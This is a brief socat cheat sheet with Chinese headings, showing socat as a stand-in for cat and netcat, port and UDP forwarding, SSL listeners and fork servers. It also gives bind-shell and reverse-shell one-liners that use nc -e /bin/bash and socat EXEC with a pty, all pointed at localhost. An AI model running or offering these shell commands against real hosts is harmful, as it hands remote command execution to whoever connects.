# socat as cat
socat - -

socat - file

echo "hello" | socat - file

# socat as nc
nc localhost 80

socat - TCP:localhost:80

nc -lp localhost 700

socat TCP-LISTEN:700 -

# 正向 shell
nc -lp localhost 700 -e /bin/bash

socat TCP-LISTEN:700 EXEC:/bin/bash

# 反弹 shell
nc localhost 700 -e /bin/bash

socat tcp-connect:localhost:700 exec:'bash -li',pty,stderr,setsid,sigint,sane

# 将本地 80 端口转发到远程的 80 端口
socat TCP-LISTEN:80,fork TCP:www.domain.org:80

# SSL 服务器
socat OPENSSL-LISTEN:443,cert=/cert.pem -
需要首先生成证书文件

# SSL 客户端
socat - OPENSSL:localhost:443

# fork 服务器
可以将一个使用标准输入输出的单进程程序变为一个使用 fork 方法的多进程服务

socat TCP-LISTEN:1234,reuseaddr,fork EXEC:./app

# forward UDP
socat UDP4-RECVFROM:161,fork UDP4-SENDTO:localhost:10161

# Server udp forward
socat udp-listen:port1 udp-listen:port2

# send data to server udp port
socat - udp:serverip:port

# receive data from server udp port
socat udp:serverip:port

# debug socat
socat -d -d

# forward UDP
socat -d -d UDP4-RECV:1234 UDP4-SENDTO:localhost:2234
